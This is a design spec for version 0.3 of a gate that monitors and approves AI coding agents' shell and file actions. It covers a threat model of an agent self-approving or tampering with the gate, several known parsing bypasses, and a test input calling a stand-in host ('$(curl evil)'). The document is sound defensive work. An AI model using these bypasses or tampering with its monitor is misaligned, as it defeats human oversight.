# agent-belay v0.3 — Trustworthy Gate

Status: **Partially shipped** (v0.3.0–v0.3.2). Open gaps: [v0.3-remaining.md](./v0.3-remaining.md).
Predecessor: v0.2 (shipped via PR #3, scoped by [`v0.2-plan.md`](./v0.2-plan.md))
Supersedes: [`SPEC-v0.2-historical.md`](./archive/SPEC-v0.2-historical.md) as the carrier of the security-hardening requirements (that spec was not implemented as written; see its status note)
Companion: [`ROADMAP-strategic.md`](./ROADMAP-strategic.md)
Traceability: internal security review (see [`SECURITY.md`](../SECURITY.md))

## 1. Introduction

v0.2 (as shipped) delivered the architectural foundation this spec builds on:
classification, approval, fingerprinting, and redaction now live in
unit-testable host-independent modules under `src/core/`, the generated runtime
is a bundle of that core (`scripts/build-runtime.mjs`) behind a thin Cursor
adapter (`src/adapters/cursor/`), classifier coverage grew (chain/pipe
worst-verdict, pipe-to-shell denial, `bash -c`/`node -e` script extraction,
tool gates for `Write`/`StrReplace`/`Delete`), and an ops CLI landed
(`status`, `explain`, `revoke`, `upgrade`).

What v0.2 did **not** deliver is the security hardening from the internal
review: the gate still **fails open** on unknown commands
(`unknown_local_effect` → `allow_flagged` in
[`src/core/classify-shell.ts`](../src/core/classify-shell.ts)), the **control
plane is still in-repo and writable** by the monitored agent (approval state,
config, hooks, bundled runtime), the audit log still records **secrets in
cleartext** (`src/core/scrub.ts` masks only approval ids/UUIDs/timestamps),
and several parsing bypasses remain (command substitution, subshells, symlink
escape of containment checks).

v0.3 makes the gate worth trusting. It does three things:

1. **Fails closed**: unknown or unparseable gated actions escalate to
   `deny_pending_approval` by default, with operator policy to opt out.
2. **Protects the control plane** so the monitored agent cannot silently
   disable or self-approve the gate (against the primary threat model).
3. **Stops leaking secrets** into the audit log, and gives operators
   first-class `overrides` (growing the shipped `classifier.custom*` fields
   into a precedence-governed mechanism).

The second adapter and the formal runtime contract move to v0.4: a gate should
be trustworthy before it is portable.

## 2. Threat model (explicit)

- **Primary (v0.3 defends against this): a cooperative-but-fallible or mildly
  misaligned agent.** It generally respects tool and permission boundaries —
  it will not deliberately escalate OS privileges — but it *will* run risky
  commands by mistake, take shortcuts, or reach for an effect (deploy, push,
  delete) without realizing the blast radius. For this model, relocating
  mutable state out of the repo, hash-pinning the runtime, and failing closed
  on ambiguity are meaningful, enforceable boundaries.

- **Secondary (documented, not fully solved): an adversarial agent with
  unrestricted shell as the same OS user.** Belay's hooks run as that same
  user, so such an agent can in principle reach any path the user can,
  including a relocated control plane. v0.3 raises the cost and makes
  tampering *detectable* (integrity checks), but cannot *guarantee*
  containment without OS-level controls (separate user, sandbox, file ACLs).
  This SHALL be stated plainly in `SECURITY.md`. Closing it is out of scope.

Every requirement below is enforceable against the primary model, and we never
claim more than that.

## 3. Goals / Non-goals

### Goals

- G1. Fail closed: unknown or unparseable gated actions escalate to
  `deny_pending_approval` by default.
- G2. Robust shell understanding: no trivial syntactic evasion of the
  external/irreversible verdicts (close the residual bypasses v0.2 left open).
- G3. A control plane the monitored agent cannot silently disable or
  self-approve (against the primary threat model), with tampering detectable.
- G4. No secrets written to the audit log in cleartext.
- G5. Operator-tunable policy and overrides with documented precedence,
  growing out of the shipped `classifier.customAllowCommands` /
  `customExternalCommands`.
- G6. A usable approval loop on the relocated control plane (`status`,
  `revoke`, clear denial messages keep working).
- G7. Honest, accurate `SECURITY.md` and `README.md`.
- G8. Clean migration from a shipped-v0.2 install (config v2 → v3, in-repo
  approval state → relocated).

### Non-goals (deferred)

- N1. Second runtime adapter (Claude Code) and the formal runtime-level
  `GatedAction`/`Verdict` contract → v0.4. (The installer-level
  `BelayAdapter` interface from v0.2 stays as-is.)
- N2. Model-assisted classification, policy-as-code → v0.5.
- N3. Audit query tooling, policy simulation, out-of-band approval → v0.6.
- N4. OS-level sandboxing of an adversarial agent → tracked, not promised.

## 4. Baseline: shipped v0.2 behavior this spec builds on

For precision, requirements below assume (and preserve unless explicitly
changed) the following shipped behavior:

- Core modules in `src/core/` are directly unit-testable; the generated
  runtime is a deterministic bundle of them (`dist/bundle/cursor-runtime.mjs`
  embedded via `src/templates.ts`).
- Chained commands are classified per segment with the strictest verdict
  winning (`classifier.strictChains`); piping into a shell interpreter is
  denied; `bash -c "…"` / `node -e "…"` scripts are extracted and classified
  recursively; env-variable prefixes are stripped by the tokenizer; `sed -i`
  is recognized.
- Gates: `shell`, `subagent`, `fileMutation` (Write/StrReplace/Delete with
  `classifier.sensitivePaths`), `toolShell`.
- Verdicts carry a structured `Assessment` (`reversibility`, `external`,
  `blastRadius`, `confidence`, `signals`).
- CLI: `init` (merges config), `upgrade` (refreshes hooks/runtime, merges
  config), `doctor` (version/build-stamp checks), `status`, `explain`,
  `revoke`.
- **Unknown commands currently return `allow_flagged` with reason
  `unknown_local_effect`. v0.3 deliberately changes this default (R2).**

## 5. Functional requirements

Written in the project's EARS style (`WHEN … THEN the system SHALL …`). Each
requirement cites the security-review clause it satisfies (`bugfix 2.x`) or
marks `[NEW]`. Implementation homes are the v0.2 modules: shell rules in
[`src/core/classify-shell.ts`](../src/core/classify-shell.ts) /
[`src/core/shell-tokenizer.ts`](../src/core/shell-tokenizer.ts), containment in
[`src/core/path-utils.ts`](../src/core/path-utils.ts), redaction in
[`src/core/scrub.ts`](../src/core/scrub.ts), config in
[`src/core/config.ts`](../src/core/config.ts), install/relocation in
[`src/installer.ts`](../src/installer.ts) and
[`src/adapters/cursor/`](../src/adapters/cursor/), verification in
[`src/doctor.ts`](../src/doctor.ts).

### 5.1 Shell parsing & fail-closed semantics

- **R1 (bugfix 2.2).** WHEN a shell command contains a construct the tokenizer
  cannot fully resolve — command substitution `$( )` or backticks, a subshell
  `( )`, a brace group `{ }`, process substitution, or a newline used as a
  command separator — THEN the system SHALL classify the command as
  `unparseable` and return `deny_pending_approval` (reason
  `unparseable_shell`), rather than allowing it. (The shipped tokenizer
  handles quotes, escapes, and `&&`/`||`/`|` segmentation; these constructs
  are the remaining gap.)

- **R2 (bugfix 2.5 / G1).** WHEN a segment's resolved command key matches no
  classification set and no override THEN the system SHALL fail closed and
  return `deny_pending_approval` (reason `unknown_command`) by default —
  **replacing** the shipped `unknown_local_effect` → `allow_flagged` fallback.
  Operators MAY opt back into fail-open via `policy.unknownCommand: "flag"`
  (§6), in which case the verdict reverts to `allow_flagged` with the existing
  `unknown_local_effect` reason and signal, but the default SHALL be `"deny"`.

- **R3 (bugfix 2.4).** WHEN an external/dangerous command is expressed via an
  absolute or relative path (`/usr/bin/curl`, `./deploy.sh`), via a wrapper
  not already covered by the shipped script extraction (`env`, `xargs`,
  `nohup`, `time`, `sudo`), or with flags before the subcommand
  (`git -C . push`) THEN the system SHALL resolve the effective command (by
  basename, by recursively inspecting wrapper arguments, and by skipping
  option flags when computing the command key) and apply the matching verdict,
  OR escalate to `deny_pending_approval` (reason `unresolved_command`) when
  the construct cannot be confidently resolved. Prefer escalation over clever
  resolution.

- **R4 (bugfix 2.1).** WHEN a segment's resolved command key is a
  general-purpose interpreter (`node`, `deno`, `bun`, `python`/`python3`,
  `ruby`, `perl`) and its script is not extracted and classified by the
  shipped `extractInterpreterScript` path THEN the system SHALL treat it as an
  arbitrary-code-execution risk and escalate to `deny_pending_approval`
  (reason `arbitrary_code`); it SHALL never classify as read-only. `find`
  SHALL escalate to `deny_pending_approval` when carrying
  `-exec`/`-execdir`/`-delete` and otherwise be `allow_flagged`; `sed` SHALL
  remain at least `allow_flagged` (the shipped `-i` detection escalates).

### 5.2 Path containment

- **R5 (bugfix 2.8).** WHEN a mutation or redirect target resolves — after
  `realpath`/symlink resolution — to a path outside the repository root THEN
  the system SHALL return the appropriate `outside_repo_redirect` /
  `outside_repo_mutation` `deny_pending_approval` verdict. `relativeWithinRepo`
  / `resolveMutationTarget` and their callers (including the `fileMutation`
  tool gate) SHALL resolve the real path before string-based containment math,
  closing the in-repo-symlink-to-outside bypass.

### 5.3 Control-plane integrity

- **R6 (bugfix 2.6 / G3).** WHEN `init` or `upgrade` installs the gate THEN
  mutable approval state (`pending-approvals.json`,
  `approved-approvals.json`) SHALL be stored outside the monitored repository
  — in an OS user-config location keyed by the repo's real path (e.g.
  `~/.config/agent-belay/<repo-key>/`, honoring `XDG_CONFIG_HOME`) — so an
  agent operating within the repo cannot write self-approvals into the state
  the gate reads. The audit log MAY remain in-repo (default, configurable).

- **R7 (bugfix 2.6 / G3).** WHEN `init` or `upgrade` installs the gate THEN it
  SHALL record a content hash of the installed runtime bundle and hook files
  in the out-of-repo control-plane location, and a snapshot hash of the
  effective (normalized) config. WHEN any gate hook starts THEN it SHALL
  verify the in-repo runtime/hooks against the pinned hashes; on mismatch the
  gate SHALL fail closed (deny gated actions, reason
  `control_plane_tampered`) with an operator message pointing at
  `agent-belay doctor`. Because `init`/`upgrade` now **merge** config rather
  than rewrite it, config verification SHALL be advisory: `doctor` and the
  hooks report drift since the last pin (warning, not deny), and any CLI run
  that legitimately changes config re-pins. See OQ2.

- **R8 (bugfix 2.6 / G3).** WHEN a gated action's resolved mutation or
  redirect target is a control-plane file — `belay.config.json`, the relocated
  approval-state files, `hooks.json`, any `belay-*.mjs` hook, or the bundled
  runtime — THEN the system SHALL escalate to `deny_pending_approval` (reason
  `control_plane_write`), regardless of whether the path is otherwise
  in-repo. This SHALL apply to **both** the shell gate and the `fileMutation`
  tool gate, so the agent cannot edit the control plane via `Write` tools
  either.

- **R9 (bugfix 2.6).** The residual gap — the monitored side runs as the same
  OS user, so relocation/integrity only mitigate against the primary threat
  model — SHALL be documented in `SECURITY.md` (ties to §2).

### 5.4 Secret redaction

- **R10 (bugfix 2.7 / G4).** WHEN any audited value is written to
  `audit.ndjson` THEN the system SHALL scrub common secret patterns before
  writing — at minimum `Bearer <token>`, `Authorization:` header values,
  `key`/`token`/`secret`/`password`-style `name=value` pairs, and long
  high-entropy strings — in addition to the existing approval-id masking in
  `scrubString`. Redaction SHALL preserve enough structure that the entry
  remains useful for audit (mask the value, keep the key/shape). Operators
  MAY add patterns via `redaction.patterns` (§6). The same scrubbing SHALL
  apply to `user_message` summaries and `explain` output destined for logs.

### 5.5 Subagent intent classification

- **R11 (bugfix 2.9).** WHEN a subagent/Task payload is classified THEN the
  system SHALL use token/whole-word aware matching (not raw substring
  matching), so benign wording like "respond" or "production-ready" is not
  mis-flagged as `send`/`prod`, while genuine external-effect intent is still
  escalated. Payloads the system cannot confidently classify SHALL escalate
  to `deny_pending_approval`. (The shipped v0.2 context-scoring work in
  `classify-subagent.ts` partially covers this; the requirement is the
  acceptance bar, not a rewrite mandate.)

### 5.6 Policy & overrides `[NEW]`

- **R12 [NEW].** WHEN `belay.config.json` declares `policy` settings THEN the
  runtime SHALL honor them: `policy.unknownCommand` (`"deny"` default |
  `"flag"`) controls R2, and `policy.unparseableShell` (`"deny"` default |
  `"flag"`) controls R1.

- **R13 [NEW].** WHEN `belay.config.json` declares `overrides` THEN the
  runtime SHALL evaluate them against the resolved command key / normalized
  command before the built-in command sets: `overrides.deny` →
  `deny_pending_approval`, `overrides.flag` → `allow_flagged`,
  `overrides.allow` → `allow`. Patterns use the simple glob (`*`) matching
  already shipped in `custom-command-match.ts`. The shipped
  `classifier.customExternalCommands` / `customAllowCommands` SHALL migrate
  into `overrides.deny` / `overrides.allow` (§7). Precedence SHALL be:
  control-plane write (R8) > `overrides.deny` > built-in
  external/outside-repo > `overrides.flag` > `overrides.allow` > built-in
  read-only > fail-closed default (R2). This precedence SHALL be documented
  and tested so an override cannot silently re-allow a control-plane write or
  an outside-repo effect.

### 5.7 Approval UX on the relocated control plane

- **R14.** `agent-belay status`, `revoke`, and the `/belay-approve` round trip
  (`beforeSubmitPrompt` hook) SHALL work unchanged against the relocated
  approval state (R6). `status --json` SHALL emit machine output if it does
  not already.

- **R15.** WHEN the gate denies an action THEN the `user_message` SHALL
  include the reason, a redacted one-line summary of what was blocked, the
  approval id, and the exact retry instruction (the shipped
  `buildRetryInstruction` covers the last item) — so the human approving can
  decide without inspecting files.

### 5.8 Preserved behavior (regression prevention)

These shipped-v0.2 behaviors MUST NOT change:

- **R16.** Genuine read-only, non-interpreter commands (`rg`, `ls`, `cat`,
  `git status`, `git diff`, `git log`) → `allow`.
- **R17.** Recognized in-repo mutations (`touch`, `mkdir`, `git add`,
  `git commit`) → `allow_flagged`, recorded in the audit log.
- **R18.** Recognized external-effect commands (`git push`, `curl`,
  `npm publish`, `terraform apply`, `docker push`) → `deny_pending_approval`
  (reason `external_effect`).
- **R19.** Chain/pipe semantics: per-segment classification with strictest
  verdict; pipe-into-interpreter denied; `bash -c`/`node -e` script
  extraction.
- **R20.** Tool gates: `fileMutation` (with `sensitivePaths`) and `toolShell`
  verdicts; per-gate ON/OFF via `gates.*` returns `allow` when disabled.
- **R21.** One-shot approval: a valid `/belay-approve <id>` allows exactly one
  matching action before expiry (15-minute default TTL), then resumes
  denying; `revoke` cancels a pending approval.
- **R22.** `mode: "audit"` logs would-be denies but allows execution.
- **R23.** A throwing gate hook fails closed (`permission: "deny"`).
- **R24.** `Assessment` (`signals` included) stays on classify results and in
  the audit log when `audit.includeAssessment` is true; `explain` keeps
  showing why a verdict was reached — which matters more once fail-closed
  defaults increase denial volume.
- **R25.** `init`/`upgrade` config-merge semantics: operator additions to
  `belay.config.json` survive re-runs.

## 6. Config schema v3

`belay.config.json` bumps to `version: 3`, **building on the shipped v2
schema** (not the unimplemented SPEC-v0.2 §5 draft, which is void). New
fields are additive; v1/v2 configs migrate by normalization (§7).

```json
{
  "version": 3,
  "mode": "enforce",
  "approvalTtlMinutes": 15,
  "tokenPrefix": "/belay-approve",
  "gates": {
    "shell": true,
    "subagent": true,
    "fileMutation": true,
    "toolShell": true
  },
  "policy": {
    "unknownCommand": "deny",
    "unparseableShell": "deny"
  },
  "overrides": {
    "allow": [],
    "flag": [],
    "deny": []
  },
  "classifier": {
    "strictChains": true,
    "sensitivePaths": [".env", ".env.*", "**/credentials/**"]
  },
  "redaction": {
    "enabled": true,
    "patterns": []
  },
  "controlPlane": {
    "stateLocation": "user-config",
    "integrity": "hash-pinned"
  },
  "audit": {
    "logPath": ".cursor/belay/audit.ndjson",
    "includeAssessment": true
  }
}
```

Field notes:

- `policy.*`: `"deny"` (default, fail-closed) or `"flag"` (opt-in fail-open).
  See R1, R2, R12.
- `overrides.{allow,flag,deny}`: glob patterns per §5.6 precedence;
  `classifier.customExternalCommands`/`customAllowCommands` are **removed**
  from the schema and auto-migrated here (§7).
- `classifier.strictChains` / `sensitivePaths`: unchanged from shipped v2.
- `redaction.enabled` / `patterns`: built-in secret masking on/off plus extra
  operator regex. See R10.
- `controlPlane.stateLocation`: `"user-config"` (default, R6) or `"repo"`
  (opt back into the v2 location, documented as weaker).
- `controlPlane.integrity`: `"hash-pinned"` (default, R7) or `"none"`.

`BelayConfigV3` joins `config.ts` alongside V1/V2; `normalizeConfig` /
`migrateConfig` / `mergeConfig` extend to the new sections with the existing
deep-merge behavior.

## 7. Migration & backward compatibility

- **M1.** WHEN `init` or `upgrade` finds a v1/v2 `belay.config.json` THEN it
  SHALL normalize to v3, preserving all operator-set values, mapping
  `classifier.customExternalCommands` → `overrides.deny` and
  `classifier.customAllowCommands` → `overrides.allow`, and filling new
  sections with defaults. Consistent with the shipped merge-don't-rewrite
  rule (R25).
- **M2.** WHEN `init`/`upgrade` runs with `controlPlane.stateLocation:
  "user-config"` and finds in-repo approval files THEN it SHALL migrate
  unexpired approvals to the relocated location and leave a short note; stale
  in-repo files become inert. The approval-file schema
  (`ApprovalStateFile`, version 1) is unchanged.
- **M3.** A repo upgraded to v0.3 hooks but still carrying a v2 config SHALL
  run: the runtime config normalization applies v3 defaults (fail-closed
  included) at load time.
- **M4.** `--with-skill` behavior is unchanged. Skill/command templates SHALL
  be updated to mention `status`/`revoke` and the fail-closed default.

## 8. Testing requirements

Core behavior is now directly unit-testable (v0.2's main structural win);
end-to-end behavior is verified through the generated runtime as
`hooks-runtime.test.ts` already does. CI gates per
[`CONTRIBUTING.md`](../CONTRIBUTING.md): `pnpm lint`, `pnpm typecheck`,
`pnpm test`, `pnpm build`.

- **T1.** Bypass regression suite (unit, in `classify-shell.test.ts` et al.):
  one failing-then-passing case per security-review clause still open after
  v0.2 — `$(curl evil)`, backticks, subshell/brace group, newline separator,
  unknown command fail-closed, `/usr/bin/curl`, `sudo`/`env`/`xargs`
  wrappers, `git -C . push`, bare `python script.py`, `find -exec`,
  in-repo symlink → outside (realpath), control-plane write via shell and via
  `Write` tool, `Bearer` token in audit.
- **T2.** Preservation suite: R16–R25 keep their shipped-v0.2 verdicts
  (extend existing unit + e2e tests; chain/pipe and tool-gate cases
  included).
- **T3.** Control plane (e2e): approval state is created outside the repo and
  the `/belay-approve` round trip works against it; a tampered bundle trips
  the integrity check and fails closed; config drift produces a doctor
  warning, not a deny.
- **T4.** Policy & overrides: §5.6 precedence enforced — an `overrides.allow`
  cannot re-allow a control-plane write or outside-repo effect;
  `policy.unknownCommand: "flag"` restores the v0.2 fallback verbatim
  (verdict, reason, signal).
- **T5.** Redaction: a secret-bearing command is masked in `audit.ndjson` and
  in `user_message` while structure and verdict remain.
- **T6.** Migration: a shipped-v0.2 install upgrades — config v2 → v3 with
  `custom*` → `overrides` mapping, unexpired approvals relocated, hashes
  pinned (M1–M3).
- **T7.** CLI: `status`/`revoke` operate on the relocated state; `doctor`
  reports integrity status and config drift.

## 9. Acceptance criteria (definition of done)

1. Every still-open `2.x` clause of the security review has a passing
   regression test (T1); no preservation test regresses (T2).
2. Default-config installs fail closed on unknown and unparseable commands.
3. Approval state lives outside the monitored repo by default; runtime
   tampering and control-plane writes (shell **and** Write-tool paths) fail
   closed (T3).
4. No secret from the curated test corpus appears in cleartext in
   `audit.ndjson` (T5).
5. `policy` and `overrides` change verdicts as specified and cannot override
   control-plane / outside-repo protections; `custom*` configs migrate
   automatically (T4, T6).
6. `README.md` and `SECURITY.md` describe v0.3 behavior and the §2 threat
   model accurately — no guardrail is described as a boundary.
7. A shipped-v0.2 install upgrades cleanly via `upgrade` (T6).

## 10. Risks & open questions

- **OQ1. Fail-closed noise.** Flipping `unknown_local_effect` from flag to
  deny is the biggest UX change in the project's history; it will deny
  commands users consider mundane. Mitigations are already in hand —
  `overrides.allow`, `explain` (shows the deciding signal), a fast
  `status`/approve loop — but watch real allow/deny ratios before locking the
  default. If noise is unacceptable in practice, the fallback position is
  `unknownCommand: "deny"` for new installs and `"flag"` for migrated v2
  installs, decided at M1 time.
- **OQ2. Config pinning vs. merge semantics.** v0.2 made `init`/`upgrade`
  merge config (operator edits are *expected*), which conflicts with v0.2-spec
  style hard config pinning. R7's resolution — hard-pin the runtime/hooks,
  advisory-pin the config, gate config writes via R8 — means a config edit by
  the agent is *blocked at write time* rather than detected at read time.
  Verify the R8 deny actually covers every mutation path the agent has
  (shell redirects, `tee`, Write tool) and document what remains.
- **OQ3. Relocated state and the approval round trip.** The
  `beforeSubmitPrompt` hook must read/write the user-config path in all
  install layouts (incl. Windows `%APPDATA%` parity per the roadmap's
  cross-cutting backlog). Confirm before locking R6's default.
- **OQ4. Wrapper resolution (R3) recursion** could itself become a parsing
  surface; prefer "escalate when unsure" over clever resolution.
- **OQ5. Over-redaction (R10)** can hide what actually happened. Keep masking
  structure-preserving and tested.

## 11. Out of scope for v0.3

Deferred per §3 non-goals: the Claude Code adapter and formal runtime
contract (v0.4), model-assisted classification and policy-as-code (v0.5),
audit query tooling / policy simulation / out-of-band approval (v0.6), and
OS-level sandboxing of an adversarial agent (tracked, not promised). See
[`ROADMAP-strategic.md`](./ROADMAP-strategic.md).
